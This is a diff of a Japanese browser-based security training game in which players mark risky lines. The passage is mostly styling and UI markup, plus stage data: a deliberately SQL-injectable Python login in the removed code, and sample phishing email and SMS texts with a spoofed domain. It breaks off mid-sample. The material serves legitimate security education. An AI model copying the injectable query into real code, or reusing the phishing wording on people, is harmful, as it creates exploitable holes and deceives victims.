@@ -4,143 +4,211 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>ホワイトハッカー・ミッション</title>
+<!-- このファイルは build.sh で自動生成されます。編集は src/ フォルダのファイルで行ってください。 -->
 <style>
-  :root {
-    --bg: #0b1210;
-    --panel: #111c19;
-    --panel2: #16241f;
-    --line: #1f332c;
-    --text: #d6f5e8;
-    --muted: #7fa898;
-    --accent: #2ee88f;
-    --accent2: #39c6ff;
-    --danger: #ff5c6c;
-    --warn: #ffc94d;
-    --mono: "Consolas", "Menlo", "Courier New", monospace;
-  }
-  * { box-sizing: border-box; }
-  body {
-    margin: 0; background: var(--bg); color: var(--text);
-    font-family: "Hiragino Kaku Gothic ProN", "Yu Gothic", "Meiryo", sans-serif;
-    line-height: 1.6; min-height: 100vh;
-  }
-  .wrap { max-width: 920px; margin: 0 auto; padding: 16px; }
-  h1, h2, h3 { margin: 0 0 8px; }
-  .screen { display: none; }
-  .screen.active { display: block; }
-  .card {
-    background: var(--panel); border: 1px solid var(--line); border-radius: 12px;
-    padding: 18px; margin-bottom: 14px;
-  }
-  .title-logo {
-    font-family: var(--mono); color: var(--accent); font-size: clamp(22px, 6vw, 40px);
-    text-shadow: 0 0 12px rgba(46,232,143,.5); letter-spacing: 1px;
-  }
-  .sub { color: var(--muted); }
-  button {
-    font: inherit; cursor: pointer; border-radius: 8px; border: 1px solid var(--accent);
-    background: transparent; color: var(--accent); padding: 10px 18px; font-weight: bold;
-  }
-  button:hover { background: rgba(46,232,143,.12); }
-  button.primary { background: var(--accent); color: #062014; }
-  button.primary:hover { filter: brightness(1.1); }
-  button.ghost { border-color: var(--line); color: var(--muted); }
-  button:disabled { opacity: .4; cursor: default; }
-  .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-  .spacer { flex: 1; }
-  .hud {
-    display: flex; gap: 10px; flex-wrap: wrap; font-family: var(--mono);
-    background: var(--panel2); border: 1px solid var(--line); border-radius: 10px;
-    padding: 8px 12px; margin-bottom: 12px; font-size: 14px;
-  }
-  .hud b { color: var(--accent); }
-  .badge {
-    display: inline-block; font-size: 12px; padding: 2px 8px; border-radius: 99px;
-    background: var(--panel2); border: 1px solid var(--line); color: var(--accent2);
-  }
-  .scenario { border-left: 4px solid var(--accent2); }
-  .code {
-    font-family: var(--mono); font-size: 14px; background: #070c0b;
-    border: 1px solid var(--line); border-radius: 10px; overflow-x: auto; padding: 6px 0;
-  }
-  .ln {
-    display: flex; width: 100%; text-align: left; border: none; border-radius: 0;
-    background: transparent; color: var(--text); padding: 3px 12px 3px 0;
-    font-family: var(--mono); font-weight: normal; white-space: pre; min-width: max-content;
-    border-left: 4px solid transparent;
-  }
-  .ln:hover { background: rgba(57,198,255,.08); }
-  .ln .no { color: #4c6b60; width: 40px; text-align: right; padding-right: 12px; flex: none; user-select: none; }
-  .ln.marked { background: rgba(255,201,77,.15); border-left-color: var(--warn); }
-  .ln.hit { background: rgba(46,232,143,.18); border-left-color: var(--accent); }
-  .ln.miss { background: rgba(255,92,108,.18); border-left-color: var(--danger); }
-  .ln.fp { background: rgba(127,168,152,.12); border-left-color: var(--muted); text-decoration: line-through; }
-  .ln.done { cursor: default; }
-  .hint { color: var(--warn); margin-top: 10px; display: none; }
-  .result-item { border-radius: 10px; padding: 12px; margin-bottom: 10px; background: var(--panel2); border-left: 4px solid var(--line); }
-  .result-item.ok { border-left-color: var(--accent); }
-  .result-item.ng { border-left-color: var(--danger); }
-  .result-item h4 { margin: 0 0 6px; }
-  .fix { font-family: var(--mono); font-size: 13px; background: #070c0b; padding: 8px 10px; border-radius: 6px; white-space: pre-wrap; margin-top: 6px; color: var(--accent); }
-  .choices { display: grid; gap: 8px; margin-top: 10px; }
-  .choices button { text-align: left; border-color: var(--line); color: var(--text); font-weight: normal; }
-  .choices button.correct { border-color: var(--accent); background: rgba(46,232,143,.15); }
-  .choices button.wrong { border-color: var(--danger); background: rgba(255,92,108,.15); }
-  .stage-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
-  .stage-grid button { text-align: left; border-color: var(--line); color: var(--text); font-weight: normal; }
-  .stage-grid button small { color: var(--muted); display: block; }
-  .rank { font-size: 64px; font-family: var(--mono); color: var(--accent); text-shadow: 0 0 18px rgba(46,232,143,.6); line-height: 1.1; }
-  .lesson h3 { color: var(--accent); }
-  .lesson h4 { margin: 14px 0 4px; color: var(--accent2); font-size: 15px; }
-  .lesson p { margin: 4px 0; }
-  .lesson ul { margin: 4px 0; padding-left: 20px; }
-  .lesson .ex { font-family: var(--mono); font-size: 13px; background: #070c0b; border: 1px solid var(--line);
-    padding: 8px 10px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; color: var(--warn); margin: 6px 0; }
-  .lesson .tip { background: var(--panel2); border-left: 4px solid var(--warn); padding: 8px 12px; border-radius: 6px; margin-top: 12px; font-size: 14px; }
-  .toc { display: grid; grid-template-columns: repeat(auto-fill, minmax(210px, 1fr)); gap: 8px; }
-  .toc a { color: var(--text); text-decoration: none; background: var(--panel2); border: 1px solid var(--line); border-radius: 8px; padding: 8px 10px; font-size: 14px; }
-  .toc a:hover { border-color: var(--accent); }
-  .modal { position: fixed; inset: 0; background: rgba(0,0,0,.7); display: none; padding: 16px; overflow-y: auto; z-index: 10; }
-  .modal.open { display: block; }
-  .modal .card { max-width: 820px; margin: 20px auto; }
-  .toast {
-    position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%);
-    background: var(--panel2); border: 1px solid var(--accent); color: var(--accent);
-    padding: 8px 16px; border-radius: 8px; font-family: var(--mono); opacity: 0; transition: opacity .2s;
-    pointer-events: none;
-  }
-  .toast.show { opacity: 1; }
-  ul.rules { padding-left: 20px; margin: 6px 0; }
-  .typing::after { content: "▋"; animation: blink 1s steps(1) infinite; color: var(--accent); }
-  @keyframes blink { 50% { opacity: 0; } }
-  .score-big { font-family: var(--mono); font-size: 28px; color: var(--accent); }
-  table.sum { width: 100%; border-collapse: collapse; font-size: 14px; }
-  table.sum td, table.sum th { border-bottom: 1px solid var(--line); padding: 6px; text-align: left; }
+:root {
+  --bg: #0b1210;
+  --panel: #111c19;
+  --panel2: #16241f;
+  --line: #1f332c;
+  --text: #d6f5e8;
+  --muted: #7fa898;
+  --accent: #2ee88f;
+  --accent2: #39c6ff;
+  --danger: #ff5c6c;
+  --warn: #ffc94d;
+  --gold: #ffd76a;
+  --mono: "Consolas", "Menlo", "Courier New", monospace;
+}
+* { box-sizing: border-box; }
+body {
+  margin: 0; background: var(--bg); color: var(--text);
+  font-family: "Hiragino Kaku Gothic ProN", "Yu Gothic", "Meiryo", sans-serif;
+  line-height: 1.6; min-height: 100vh;
+}
+.wrap { max-width: 920px; margin: 0 auto; padding: 16px; }
+h1, h2, h3 { margin: 0 0 8px; }
+.screen { display: none; animation: fadein .25s ease; }
+.screen.active { display: block; }
+@keyframes fadein { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+.card { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 18px; margin-bottom: 14px; }
+.title-logo { font-family: var(--mono); color: var(--accent); font-size: clamp(22px, 6vw, 40px); text-shadow: 0 0 12px rgba(46,232,143,.5); letter-spacing: 1px; }
+.sub { color: var(--muted); }
+button {
+  font: inherit; cursor: pointer; border-radius: 8px; border: 1px solid var(--accent);
+  background: transparent; color: var(--accent); padding: 10px 18px; font-weight: bold;
+  transition: transform .08s, background .15s;
+}
+button:hover { background: rgba(46,232,143,.12); }
+button:active { transform: scale(.97); }
+button.primary { background: var(--accent); color: #062014; }
+button.primary:hover { filter: brightness(1.1); }
+button.ghost { border-color: var(--line); color: var(--muted); }
+button:disabled { opacity: .4; cursor: default; transform: none; }
+.row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+.spacer { flex: 1; }
+.topbar { display: flex; justify-content: flex-end; margin-bottom: 6px; }
+.topbar button { padding: 4px 10px; font-size: 14px; }
+
+/* タイトル */
+.diff-chips { display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; margin: 10px 0 4px; }
+.diff-chips button { border-color: var(--line); color: var(--muted); padding: 6px 16px; }
+.diff-chips button.on { border-color: var(--accent); color: #062014; background: var(--accent); }
+.menu-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 12px; }
+.menu-grid button { text-align: left; padding: 12px 14px; }
+.menu-grid button small { display: block; font-weight: normal; color: var(--muted); font-size: 12px; }
+.menu-grid button.primary small { color: #0b3a24; }
+.menu-grid.sub-menu button { border-color: var(--line); color: var(--text); }
+
+/* ゲーム */
+.hud {
+  display: flex; gap: 10px; flex-wrap: wrap; font-family: var(--mono);
+  background: var(--panel2); border: 1px solid var(--line); border-radius: 10px;
+  padding: 8px 12px; margin-bottom: 12px; font-size: 14px; align-items: center;
+}
+.hud b { color: var(--accent); }
+.hud .timer b { color: var(--accent2); }
+.hud .timer.low b { color: var(--danger); animation: blink 1s steps(1) infinite; }
+.badge { display: inline-block; font-size: 12px; padding: 2px 8px; border-radius: 99px; background: var(--panel2); border: 1px solid var(--line); color: var(--accent2); }
+.badge.diff { color: var(--warn); }
+.scenario { border-left: 4px solid var(--accent2); }
+.story-line { background: rgba(57,198,255,.08); border-radius: 8px; padding: 8px 12px; margin-bottom: 10px; font-size: 14px; color: var(--accent2); }
+.code { font-family: var(--mono); font-size: 14px; background: #070c0b; border: 1px solid var(--line); border-radius: 10px; overflow-x: auto; padding: 6px 0; }
+.ln {
+  display: flex; width: 100%; text-align: left; border: none; border-radius: 0;
+  background: transparent; color: var(--text); padding: 3px 12px 3px 0;
+  font-family: var(--mono); font-weight: normal; white-space: pre; min-width: max-content;
+  border-left: 4px solid transparent; transition: background .15s;
+}
+.ln:active { transform: none; }
+.ln:hover { background: rgba(57,198,255,.08); }
+.ln .no { color: #4c6b60; width: 40px; text-align: right; padding-right: 12px; flex: none; user-select: none; }
+.ln.marked { background: rgba(255,201,77,.15); border-left-color: var(--warn); }
+.ln.hit { background: rgba(46,232,143,.18); border-left-color: var(--accent); animation: flash .6s ease; }
+.ln.miss { background: rgba(255,92,108,.18); border-left-color: var(--danger); }
+.ln.fp { background: rgba(127,168,152,.12); border-left-color: var(--muted); text-decoration: line-through; }
+.ln.done { cursor: default; }
+@keyframes flash { 0% { background: rgba(46,232,143,.6); } 100% { background: rgba(46,232,143,.18); } }
+.hint { color: var(--warn); margin-top: 10px; display: none; }
+
+/* 結果 */
+.result-item { border-radius: 10px; padding: 12px; margin-bottom: 10px; background: var(--panel2); border-left: 4px solid var(--line); }
+.result-item.ok { border-left-color: var(--accent); }
+.result-item.ng { border-left-color: var(--danger); }
+.result-item h4 { margin: 0 0 6px; }
+.fix { font-family: var(--mono); font-size: 13px; background: #070c0b; padding: 8px 10px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; margin-top: 6px; color: var(--accent); }
+.choices { display: grid; gap: 8px; margin-top: 10px; }
+.choices button { text-align: left; border-color: var(--line); color: var(--text); font-weight: normal; }
+.choices button.correct { border-color: var(--accent); background: rgba(46,232,143,.15); }
+.choices button.wrong { border-color: var(--danger); background: rgba(255,92,108,.15); animation: shake .35s; }
+.score-big { font-family: var(--mono); font-size: 28px; color: var(--accent); }
+.score-big.neg { color: var(--danger); animation: shake .35s; }
+@keyframes shake { 0%,100% { transform: none; } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+.bonus { color: var(--accent2); font-family: var(--mono); font-size: 14px; }
+
+/* 最終結果 */
+.rank { font-size: 72px; font-family: var(--mono); color: var(--accent); text-shadow: 0 0 18px rgba(46,232,143,.6); line-height: 1.1; animation: pop .6s cubic-bezier(.2,1.6,.4,1); }
+@keyframes pop { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+table.sum { width: 100%; border-collapse: collapse; font-size: 14px; }
+table.sum td, table.sum th { border-bottom: 1px solid var(--line); padding: 6px; text-align: left; vertical-align: middle; }
+.bar { height: 8px; background: var(--panel2); border-radius: 99px; overflow: hidden; min-width: 60px; }
+.bar > i { display: block; height: 100%; background: var(--accent); border-radius: 99px; }
+.bar.mid > i { background: var(--warn); }
+.bar.low > i { background: var(--danger); }
+.tag { font-size: 12px; padding: 1px 8px; border-radius: 99px; border: 1px solid; white-space: nowrap; }
+.tag.good { color: var(--accent); }
+.tag.mid { color: var(--warn); }
+.tag.bad { color: var(--danger); }
+.new-ach { margin: 6px 0; }
+
+/* ステージ選択 */
+.stage-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 10px; margin-top: 10px; }
+.stage-grid button { text-align: left; border-color: var(--line); color: var(--text); font-weight: normal; }
+.stage-grid button small { color: var(--muted); display: block; }
+
+/* 学習テキスト */
+.lesson h3 { color: var(--accent); }
+.lesson h4 { margin: 14px 0 4px; color: var(--accent2); font-size: 15px; }
+.lesson p { margin: 4px 0; }
+.lesson ul { margin: 4px 0; padding-left: 20px; }
+.lesson .ex { font-family: var(--mono); font-size: 13px; background: #070c0b; border: 1px solid var(--line); padding: 8px 10px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; color: var(--warn); margin: 6px 0; }
+.lesson .tip { background: var(--panel2); border-left: 4px solid var(--warn); padding: 8px 12px; border-radius: 6px; margin-top: 12px; font-size: 14px; }
+.lesson .exam { background: rgba(57,198,255,.08); border-left: 4px solid var(--accent2); padding: 8px 12px; border-radius: 6px; margin-top: 10px; font-size: 14px; }
+.lesson dl { margin: 6px 0 0; font-size: 14px; }
+.lesson dt { color: var(--accent); font-weight: bold; margin-top: 6px; }
+.lesson dd { margin: 0 0 0 1em; }
+.toc { display: grid; grid-template-columns: repeat(auto-fill, minmax(210px, 1fr)); gap: 8px; }
+.toc a { color: var(--text); text-decoration: none; background: var(--panel2); border: 1px solid var(--line); border-radius: 8px; padding: 8px 10px; font-size: 14px; }
+.toc a:hover { border-color: var(--accent); }
+.toc a.read::after { content: " ✓"; color: var(--accent); }
+
+/* 用語集 */
+.gl-search { width: 100%; font: inherit; padding: 10px 12px; border-radius: 8px; border: 1px solid var(--line); background: #070c0b; color: var(--text); margin: 8px 0; }
+.gl-item { border-bottom: 1px solid var(--line); padding: 8px 0; }
+.gl-item b { color: var(--accent); }
+.gl-item small { color: var(--muted); margin-left: 6px; }
+.gq-def { font-size: 17px; background: var(--panel2); border-radius: 10px; padding: 14px; border-left: 4px solid var(--accent2); }
+
+/* 実績 */
+.ach-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 10px; }
+.ach { display: flex; gap: 10px; align-items: center; background: var(--panel2); border: 1px solid var(--line); border-radius: 10px; padding: 10px; }
+.ach .ic { font-size: 28px; flex: none; width: 40px; text-align: center; }
+.ach.locked { opacity: .45; }
+.ach.locked .ic { filter: grayscale(1); }
+.ach b { display: block; }
+.ach small { color: var(--muted); }
+
+/* プロローグ */
+.prologue p { margin: 0 0 12px; opacity: 0; animation: fadein .5s ease forwards; }
+
+/* モーダル・トースト */
+.modal { position: fixed; inset: 0; background: rgba(0,0,0,.7); display: none; padding: 16px; overflow-y: auto; z-index: 10; }
+.modal.open { display: block; }
+.modal .card { max-width: 820px; margin: 20px auto; }
+.toasts { position: fixed; left: 50%; bottom: 20px; transform: translateX(-50%); display: flex; flex-direction: column; gap: 8px; align-items: center; z-index: 20; pointer-events: none; width: calc(100% - 32px); max-width: 420px; }
+.toast { background: var(--panel2); border: 1px solid var(--accent); color: var(--accent); padding: 8px 16px; border-radius: 8px; font-family: var(--mono); animation: fadein .2s ease; text-align: center; }
+.toast.ach { border-color: var(--gold); color: var(--gold); }
+ul.rules { padding-left: 20px; margin: 6px 0; }
+@keyframes blink { 50% { opacity: 0; } }
+table.sum button { white-space: nowrap; }
+table.sum td:first-child { min-width: 7em; }
 </style>
 </head>
 <body>
 <div class="wrap">
+  <div class="topbar"><button class="ghost" id="btn-sound">🔊 音あり</button></div>
 
   <!-- タイトル -->
   <section id="s-title" class="screen active">
     <div class="card" style="text-align:center">
       <div class="title-logo">&gt; WHITE_HAT_MISSION_</div>
       <h2>ホワイトハッカー・ミッション</h2>
-      <p class="sub">あなたはセキュリティ会社の新人ホワイトハッカー。<br>依頼されたシステムを診断し、悪いハッカーより先に<b>脆弱性（セキュリティの穴）</b>を見つけよう！</p>
-      <div class="row" style="justify-content:center">
-        <button class="primary" id="btn-start">ミッション開始</button>
-        <button id="btn-select">ステージを選ぶ</button>
-        <button id="btn-text">📖 学習テキスト</button>
+      <p class="sub">あなたはセキュリティ会社の新人ホワイトハッカー。<br>悪いハッカーより先に、システムの<b>脆弱性（セキュリティの穴）</b>を見つけよう！</p>
+      <div class="sub" style="font-size:13px">難易度</div>
+      <div class="diff-chips" id="diff-chips"></div>
+      <div class="sub" style="font-size:13px" id="diff-desc"></div>
+      <div class="menu-grid">
+        <button class="primary" id="btn-story">▶ ストーリーモード<small>全15ミッションで「まなび高校」を守れ</small></button>
+        <button id="btn-quick">⚡ クイックプレイ<small>ランダムな5ミッション</small></button>
+        <button id="btn-weak">💪 苦手克服モード<small>苦手な題材を5ミッション</small></button>
+        <button id="btn-select">🎯 ステージを選ぶ<small>題材を1つ選んでプレイ</small></button>
       </div>
-      <p class="sub" id="best-score" style="margin-top:12px"></p>
+      <div class="menu-grid sub-menu">
+        <button id="btn-text">📖 学習テキスト<small>15題材の解説</small></button>
+        <button id="btn-glossary">🎓 試験対策・用語集<small>用語集と用語クイズ</small></button>
+        <button id="btn-stats">📊 成績・苦手リスト<small>分野別の得意・苦手</small></button>
+        <button id="btn-ach">🏆 実績<small id="ach-count"></small></button>
+      </div>
+      <p class="sub" id="best-score" style="margin-top:12px;font-size:14px"></p>
     </div>
     <div class="card">
       <h3>遊び方</h3>
       <ul class="rules">
-        <li>ソースコード・メール・設定ファイル・ログが表示されます。</li>
+        <li>ソースコード・メール・SNS・設定ファイル・ログが表示されます。</li>
         <li>危ないと思う<b>行をクリック</b>してマーク（もう一度クリックで解除）。</li>
-        <li>「診断レポート提出」で答え合わせ。正解 <b>+100点</b>、間違い（安全な行）<b>-30点</b>。</li>
-        <li>ヒントを見ると <b>-50点</b>。そのあと「直し方クイズ」に正解すると <b>+50点</b>。</li>
+        <li>「診断レポート提出」で答え合わせ。見つけたら <b>+100点</b>、安全な行をマークすると減点。</li>
+        <li>そのあと「直し方クイズ」に正解すると <b>+50点</b>。【試験風】の問題も出ます。</li>
+        <li>問題は1つの題材に複数パターンあり、毎回ランダムに出題されます。</li>
       </ul>
       <h3>ホワイトハッカーの約束</h3>
       <ul class="rules">
@@ -150,11 +218,20 @@
     </div>
   </section>
 
+  <!-- プロローグ -->
+  <section id="s-prologue" class="screen">
+    <div class="card prologue">
+      <div class="title-logo" style="font-size:22px;margin-bottom:12px">&gt; STORY_MODE_</div>
+      <div id="prologue-text"></div>
+      <div class="row"><span class="spacer"></span><button class="primary" id="btn-prologue-go">ミッション1へ</button></div>
+    </div>
+  </section>
+
   <!-- ステージ選択 -->
   <section id="s-select" class="screen">
     <div class="card">
-      <div class="row"><h2>ステージ選択</h2><span class="spacer"></span><button class="ghost" id="btn-back-title">戻る</button></div>
-      <p class="sub">授業で特定のテーマだけ扱いたいときはここから。単発プレイのスコアはランキングに残りません。</p>
+      <div class="row"><h2>ステージを選ぶ</h2><span class="spacer"></span><button class="ghost" data-back>戻る</button></div>
+      <p class="sub">題材を1つ選んで遊べます。毎回ちがうパターンの問題が出ます。</p>
       <div class="stage-grid" id="stage-grid"></div>
     </div>
   </section>
@@ -164,11 +241,15 @@
     <div class="hud">
       <span>MISSION <b id="hud-stage"></b></span>
       <span>SCORE <b id="hud-score">0</b></span>
-      <span>マーク <b id="hud-marks">0</b>行</span><span>脆弱性 <b id="hud-total">0</b>件</span>
+      <span>マーク <b id="hud-marks">0</b>行</span>
+      <span>脆弱性 <b id="hud-total">0</b>件</span>
+      <span class="timer" id="hud-timer-wrap">残り <b id="hud-timer"></b>秒</span>
       <span class="spacer"></span>
+      <span id="hud-diff" class="badge diff"></span>
       <span id="hud-type" class="badge"></span>
     </div>
     <div class="card scenario">
+      <div class="story-line" id="g-story"></div>
       <h2 id="g-title"></h2>
       <div id="g-client" class="sub"></div>
       <p id="g-scenario"></p>
@@ -176,7 +257,8 @@
     <div class="code" id="g-code"></div>
     <div class="hint" id="g-hint"></div>
     <div class="row" style="margin-top:12px">
-      <button class="ghost" id="btn-hint">ヒント (-50)</button>
+      <button class="ghost" id="btn-hint"></button>
+      <button class="ghost" id="btn-quit">中断</button>
       <span class="spacer"></span>
       <button class="primary" id="btn-submit">診断レポート提出</button>
     </div>
@@ -186,11 +268,12 @@
   <section id="s-result" class="screen">
     <div class="card">
       <div class="row"><h2 id="r-title">診断結果</h2><span class="spacer"></span><span class="score-big" id="r-gain"></span></div>
-      <div class="code" id="r-code"></div>
+      <div class="bonus" id="r-bonus"></div>
+      <div class="code" id="r-code" style="margin-top:8px"></div>
       <p class="sub" style="font-size:13px">緑=発見 ／ 赤=見逃し ／ 取り消し線=安全な行をマーク</p>
       <div id="r-list"></div>
     </div>
-    <div class="card" id="quiz-card">
+    <div class="card">
       <h3>直し方クイズ</h3>
       <p id="q-text"></p>
       <div class="choices" id="q-choices"></div>
@@ -206,11 +289,20 @@
   <!-- 最終結果 -->
   <section id="s-final" class="screen">
     <div class="card" style="text-align:center">
-      <p class="sub">全ミッション完了</p>
+      <p class="sub" id="f-mode"></p>
       <div class="rank" id="f-rank"></div>
       <h2 id="f-title"></h2>
       <div class="score-big" id="f-score"></div>
       <p id="f-msg" class="sub"></p>
+      <p id="f-epilogue" style="text-align:left"></p>
+    </div>
+    <div class="card" id="f-ach-card">
+      <h3>🏆 新しく解除した実績</h3>
+      <div id="f-ach"></div>
+    </div>
+    <div class="card">
+      <h3>分野別の結果</h3>
+      <table class="sum" id="f-cats"></table>
     </div>
     <div class="card">
       <h3>ミッション別スコア</h3>
@@ -218,19 +310,72 @@
     </div>
     <div class="row" style="justify-content:center">
       <button class="primary" id="btn-retry">もう一度プレイ</button>
-      <button id="btn-to-title">タイトルへ</button>
+      <button id="btn-final-stats">📊 苦手リストを見る</button>
+      <button data-back>タイトルへ</button>
     </div>
   </section>
 
   <!-- 学習テキスト -->
   <section id="s-text" class="screen">
     <div class="card">
-      <div class="row"><h2>📖 学習テキスト</h2><span class="spacer"></span><button class="ghost" id="btn-text-back">戻る</button></div>
-      <p class="sub">ゲームに出てくる10の題材の解説です。予習してから挑戦しても、プレイ後の復習に使ってもOK。</p>
+      <div class="row"><h2>📖 学習テキスト</h2><span class="spacer"></span><button class="ghost" data-back>戻る</button></div>
+      <p class="sub">ゲームに出てくる15の題材の解説です。予習にも復習にも使えます。読んだ章には ✓ が付きます。</p>
       <div class="toc" id="text-toc"></div>
     </div>
     <div id="text-body"></div>
     <div class="row" style="justify-content:center"><button class="ghost" id="btn-text-top">▲ 目次へ戻る</button></div>
+  </section>
+
+  <!-- 用語集 -->
+  <section id="s-glossary" class="screen">
+    <div class="card">
+      <div class="row"><h2>🎓 試験対策・用語集</h2><span class="spacer"></span><button class="ghost" data-back>戻る</button></div>
+      <p class="sub">情報セキュリティマネジメント試験・基本情報技術者試験によく出る用語です。</p>
+      <div class="row"><button class="primary" id="btn-gquiz">用語クイズに挑戦（10問）</button></div>
+      <input class="gl-search" id="gl-search" type="search" placeholder="用語をさがす（例：ハッシュ、DMZ）">
+      <div id="gl-list"></div>
+    </div>
+  </section>
+
+  <!-- 用語クイズ -->
+  <section id="s-gquiz" class="screen">
+    <div class="card">
+      <div class="row"><h2>用語クイズ</h2><span class="spacer"></span><span class="badge" id="gq-progress"></span></div>
+      <p class="sub">この説明にあてはまる用語はどれ？</p>
+      <div class="gq-def" id="gq-def"></div>
+      <div class="choices" id="gq-choices"></div>
+      <p id="gq-explain" class="sub"></p>
+      <div class="row"><button class="ghost" id="btn-gq-quit">やめる</button><span class="spacer"></span><button class="primary" id="btn-gq-next" disabled>次へ</button></div>
+    </div>
+  </section>
+
+  <!-- 成績・苦手リスト -->
+  <section id="s-stats" class="screen">
+    <div class="card">
+      <div class="row"><h2>📊 成績・苦手リスト</h2><span class="spacer"></span><button class="ghost" data-back>戻る</button></div>
+      <p class="sub">これまでのプレイ記録です（このブラウザに保存されます）。正解率＝脆弱性の発見率70%＋クイズ正解率30%。</p>
+      <div id="stats-empty" class="sub"></div>
+      <h3 style="margin-top:12px">分野別</h3>
+      <table class="sum" id="stats-cats"></table>
+      <h3 style="margin-top:16px">題材別（苦手な順）</h3>
+      <table class="sum" id="stats-topics"></table>
+      <h3 style="margin-top:16px">よく見逃す脆弱性</h3>
+      <div id="stats-missed"></div>
+      <div class="row" style="margin-top:14px">
+        <button class="primary" id="btn-stats-weak">💪 苦手克服モードで練習</button>
+        <span class="spacer"></span>
+        <button class="ghost" id="btn-reset">記録をリセット</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- 実績 -->
+  <section id="s-ach" class="screen">
+    <div class="card">
+      <div class="row"><h2>🏆 実績</h2><span class="spacer"></span><button class="ghost" data-back>戻る</button></div>
+      <p class="sub" id="ach-summary"></p>
+      <div class="ach-grid" id="ach-grid"></div>
+    </div>
   </section>
 
 </div>
@@ -240,538 +385,1756 @@
     <div id="modal-body"></div>
   </div>
 </div>
-<div class="toast" id="toast"></div>
+<div class="toasts" id="toasts"></div>
 
 <script>
-/* ===================== ステージデータ =====================
-   lines   : 表示する行
-   vulns   : 脆弱性のある行（0始まり）と解説
-   neutral : 怪しいとも言える行（マークしても減点なし）
-*/
-const STAGES = [
+/* =========================================================
+   ゲームデータ
+   TOPICS : 題材（ストーリーの順番）
+     variants : 問題のパターン（毎回ランダムに1つ出題）
+       lines   : 表示する行
+       vulns   : 脆弱性のある行（0始まり）と解説
+       neutral : 怪しいとも言える行（マークしても減点なし）
+     quizzes  : 直し方クイズ（毎回ランダムに1問、選択肢もシャッフル）
+     lesson   : 学習テキスト
+     terms    : 試験対策用語（用語集・用語クイズに使う）
+   ========================================================= */
+
+const CATS = {
+  human: "人・情報の扱い",
+  web: "Webアプリ",
+  auth: "認証・アクセス管理",
+  infra: "サーバー・ネットワーク",
+  ops: "監視・インシデント対応",
+};
+
+const PROLOGUE = [
+  "ここは情報セキュリティ会社「ホワイトハット社」。",
+  "あなたは今日入社したばかりの新人ホワイトハッカーだ。",
+  "最初のクライアントは「まなび高校」。最近、謎のハッカー集団「ブラックマンバ」が学校を狙っているという情報が入った。",
+  "奴らより先に、学校のシステムに潜むすべての穴を見つけ出し、ふさがなければならない。",
+  "――ミッション、開始。",
+];
+
+const EPILOGUE = "すべての穴をふさがれ、ブラックマンバはまなび高校から手を引いた。校長先生から感謝状が届き、あなたは正式に「ホワイトハット社」のメンバーとして認められた。でも油断は禁物。攻撃者は毎日新しい手口を考えている。学び続けることこそ、ホワイトハッカー最大の武器だ。";
+
+const TOPICS = [
+  /* ---------------- 1. フィッシング ---------------- */
   {
-    title: "ログイン画面の診断",
-    client: "依頼主：まなび高校 Webサイト担当",
-    type: "Python / SQLインジェクション",
-    scenario: "生徒用ログイン画面を作りました。ユーザー名とパスワードでログインできます。危ない所がないか見てください。",
-    lines: [
-      'def login(request):',
-      '    user = request.form["username"]',
-      '    pw   = request.form["password"]',
-      '    query = "SELECT * FROM users WHERE name=\'" + user + "\' AND pass=\'" + pw + "\'"',
-      '    result = db.execute(query)',
-      '    if result:',
-      '        return "ようこそ"',
-      '    return "ログイン失敗"',
+    id: "phishing", name: "フィッシング", cat: "human",
+    story: "最初の依頼は先生から。「なんだか怪しいメッセージが届いたんだけど…」ブラックマンバはまず人をだますところから攻めてくるようだ。",
+    variants: [
+      {
+        title: "怪しいメールの調査", client: "依頼主：まなび高校の先生", type: "メール",
+        scenario: "「学校ポータル」からこんなメールが届きました。本物でしょうか？怪しいポイントを全部見つけてください。",
+        lines: [
+          "差出人: 学校ポータル事務局 <support@schoo1-portal.com>",
+          "件名: 【至急】アカウントが停止されました",
+          "",
+          "いつも学校ポータルをご利用いただきありがとうございます。",
+          "不正なアクセスを検知したため、アカウントを一時停止しました。",
+          "24時間以内に下記URLからパスワードを再設定してください。",
+          "http://schoo1-portal.com.login-check.xyz/reset",
+          "再設定しない場合、成績データはすべて削除されます。",
+          "",
+          "学校ポータル事務局",
+        ],
+        vulns: [
+          { line: 0, name: "なりすましドメイン", why: "「school」ではなく「schoo1」（数字の1）。本物そっくりの偽ドメイン。", fix: "差出人のアドレスを1文字ずつ確認し、公式サイトのドメインと比べる。" },
+          { line: 1, name: "焦らせる件名", why: "【至急】【停止】など、慌てさせて冷静に考えさせないのはフィッシングの典型。", fix: "急がされたときこそ一度止まり、別の方法（電話や公式サイト）で確認する。" },
+          { line: 6, name: "偽のURL", why: "本当のドメインは最後の「login-check.xyz」。前半に本物っぽい名前を入れてごまかしている。しかも暗号化なしのhttp。", fix: "メールのリンクは押さず、ブックマークや公式アプリからアクセスする。" },
+          { line: 7, name: "脅し文句", why: "「データが削除される」と脅して行動させようとしている。本物の学校はこんな連絡をしない。", fix: "怪しいと思ったら先生や情報担当に相談する。" },
+        ],
+        neutral: [4, 5],
+        hint: "差出人のアドレスとURLを1文字ずつよく見よう。焦らせたり脅したりする文にも注目。",
+      },
+      {
+        title: "怪しいSMSの調査", client: "依頼主：まなび高校の事務員さん", type: "SMS",
+        scenario: "スマホにこんなSMSが届きました。荷物を頼んだ覚えはある気もするけど…怪しいポイントを全部見つけてください。",
+        lines: [
+          "From: +1-202-555-0147",
+          "【ヤマネコ運輸】お荷物をお届けにあがりましたが不在のため持ち帰りました。",
+          "下記より再配達の手続きをお願いします。",
